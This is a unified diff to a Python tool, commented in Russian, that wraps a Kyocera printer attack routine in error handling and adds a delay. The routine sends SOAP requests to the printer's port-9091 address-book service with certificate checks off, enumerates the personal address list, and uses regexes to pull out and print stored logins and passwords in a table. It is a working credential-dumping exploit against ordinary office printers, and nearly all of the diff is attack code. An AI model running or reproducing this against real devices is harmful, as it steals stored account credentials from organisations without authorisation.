@@ -14,6 +14,8 @@ from lxml import etree  # Для работы с XML
 from tabulate import tabulate  # Для вывода в таблицы
 from colorama import Fore, Style  # Для цветов в консоли
 
+import time
+
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 class Kyocera:
@@ -127,33 +129,36 @@ class Kyocera:
         """
         Выгрузка аутентификационных данных из адресной книги
         """
-        response_create = requests.post(f'https://{ip}:9091{self.address_book_url}',
-                                        data=self.body_create, headers=self.headers, verify=False)
+        try:
+            response_create = requests.post(f'https://{ip}:9091{self.address_book_url}',
+                                            data=self.body_create, headers=self.headers, verify=False)
+            time.sleep(5)
+            text = response_create.content.decode("utf-8")
+            root = etree.fromstring(text)
+            for appt in root.getchildren():
+                for elem in appt.getchildren():
+                    if 'create_personal_address_enumerationResponse' in elem.tag:
+                        for item in elem.getchildren():
+                            if 'enumeration' in item.tag:
+                                self.enumeration_request = item.text
 
-        text = response_create.content.decode("utf-8")
-        root = etree.fromstring(text)
-        for appt in root.getchildren():
-            for elem in appt.getchildren():
-                if 'create_personal_address_enumerationResponse' in elem.tag:
-                    for item in elem.getchildren():
-                        if 'enumeration' in item.tag:
-                            self.enumeration_request = item.text
+            body = f'<?xml version="1.0" encoding="utf-8"?><SOAP-ENV:Envelope xmlns:SOAP-ENV="http://www.w3.org/2003/05/soap-envelope" xmlns:SOAP-ENC="http://www.w3.org/2003/05/soap-encoding" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:wsa="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:xop="http://www.w3.org/2004/08/xop/include" xmlns:ns1="http://www.kyoceramita.com/ws/km-wsdl/setting/address_book"><SOAP-ENV:Header><wsa:Action SOAP-ENV:mustUnderstand="true">http://www.kyoceramita.com/ws/km-wsdl/setting/address_book/get_personal_address_list</wsa:Action></SOAP-ENV:Header><SOAP-ENV:Body><ns1:get_personal_address_listRequest><ns1:enumeration>{self.enumeration_request}</ns1:enumeration></ns1:get_personal_address_listRequest></SOAP-ENV:Body></SOAP-ENV:Envelope>'
 
-        body = f'<?xml version="1.0" encoding="utf-8"?><SOAP-ENV:Envelope xmlns:SOAP-ENV="http://www.w3.org/2003/05/soap-envelope" xmlns:SOAP-ENC="http://www.w3.org/2003/05/soap-encoding" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:wsa="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:xop="http://www.w3.org/2004/08/xop/include" xmlns:ns1="http://www.kyoceramita.com/ws/km-wsdl/setting/address_book"><SOAP-ENV:Header><wsa:Action SOAP-ENV:mustUnderstand="true">http://www.kyoceramita.com/ws/km-wsdl/setting/address_book/get_personal_address_list</wsa:Action></SOAP-ENV:Header><SOAP-ENV:Body><ns1:get_personal_address_listRequest><ns1:enumeration>{self.enumeration_request}</ns1:enumeration></ns1:get_personal_address_listRequest></SOAP-ENV:Body></SOAP-ENV:Envelope>'
+            response_get = requests.post(f'https://{ip}:9091{self.address_book_url}',
+                                         data=body, headers=self.headers, verify=False)
 
-        response_get = requests.post(f'https://{ip}:9091{self.address_book_url}',
-                                     data=body, headers=self.headers, verify=False)
+            address_book = response_get.content.decode("utf-8")
 
-        address_book = response_get.content.decode("utf-8")
+            result = re.findall(self.regex_pattern_result, address_book)
+            credentials = []
+            for item in result:
+                creds = re.search(self.regex_pattern_credentials, item)
+                credentials.append([f'{Fore.YELLOW}{ip}{Style.RESET_ALL}', f'{Fore.YELLOW}{str(creds.group(1))}{Style.RESET_ALL}', f'{Fore.YELLOW}{str(creds.group(2))}{Style.RESET_ALL}'])
 
-        result = re.findall(self.regex_pattern_result, address_book)
-        credentials = []
-        for item in result:
-            creds = re.search(self.regex_pattern_credentials, item)
-            credentials.append([f'{Fore.YELLOW}{ip}{Style.RESET_ALL}', f'{Fore.YELLOW}{str(creds.group(1))}{Style.RESET_ALL}', f'{Fore.YELLOW}{str(creds.group(2))}{Style.RESET_ALL}'])
-
-        # Выводим таблицу с результатами
-        print(tabulate(credentials, headers=[f"{Fore.MAGENTA}IP{Style.RESET_ALL}", f"{Fore.MAGENTA}Логин{Style.RESET_ALL}", f"{Fore.MAGENTA}Пароль{Style.RESET_ALL}"], tablefmt="fancy_grid"))
+            # Выводим таблицу с результатами
+            print(tabulate(credentials, headers=[f"{Fore.MAGENTA}IP{Style.RESET_ALL}", f"{Fore.MAGENTA}Логин{Style.RESET_ALL}", f"{Fore.MAGENTA}Пароль{Style.RESET_ALL}"], tablefmt="fancy_grid"))
+        except requests.exceptions.ConnectionError:
+            pass
 
 
 if __name__ == '__main__':
